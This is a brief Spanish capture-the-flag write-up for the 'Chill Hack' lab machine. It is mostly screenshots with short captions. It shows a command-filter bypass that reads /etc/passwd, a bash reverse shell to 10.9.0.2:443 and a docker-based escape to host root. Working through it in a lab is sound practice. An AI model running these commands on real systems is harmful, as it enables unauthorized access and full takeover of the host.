---
hidden: true
---

# 💻 Chill Hack

## Escaneo

Comenzamos haciendo un escaneo de puertos con **Nmap:**

```bash
map -p- --open --min-rate 5000 -sSVC -Pn -v -oN escaneo.txt 10.10.14.130
```

<figure><img src="../../.gitbook/assets/imagen (41).png" alt=""><figcaption></figcaption></figure>

ftp y nota\


<figure><img src="../../.gitbook/assets/imagen (43).png" alt=""><figcaption></figcaption></figure>



pagina web

<figure><img src="../../.gitbook/assets/imagen (44).png" alt=""><figcaption></figcaption></figure>

gobuster



probar ruta secret&#x20;

<figure><img src="../../.gitbook/assets/imagen (45).png" alt=""><figcaption></figcaption></figure>

enccontramos restricciiones menciionadas en note.txt

<figure><img src="../../.gitbook/assets/imagen (46).png" alt=""><figcaption></figcaption></figure>

Parece que podemos pasar este filtro usando echo y confirmamos usuarios mencionados en la nota

```bash
echo $(cat /etc/passwd)
```

<figure><img src="../../.gitbook/assets/imagen (48).png" alt=""><figcaption></figcaption></figure>

reverse shell

```bash
echo $(bash -c  "bash -i >& /dev/tcp/10.9.0.2/443 0>&1")
```

<figure><img src="../../.gitbook/assets/imagen (50).png" alt=""><figcaption></figcaption></figure>

entramos a la unica carpeta del usuarioi all que tenemos permiso, y dentro de .ssh vemos ell archivo authorized\_keys

<figure><img src="../../.gitbook/assets/imagen (51).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (52).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (53).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (54).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (55).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (56).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (59).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (58).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (60).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (61).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (62).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://gtfobins.github.io/gtfobins/docker/" %}

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

<figure><img src="../../.gitbook/assets/imagen (64).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/imagen (63).png" alt=""><figcaption></figcaption></figure>
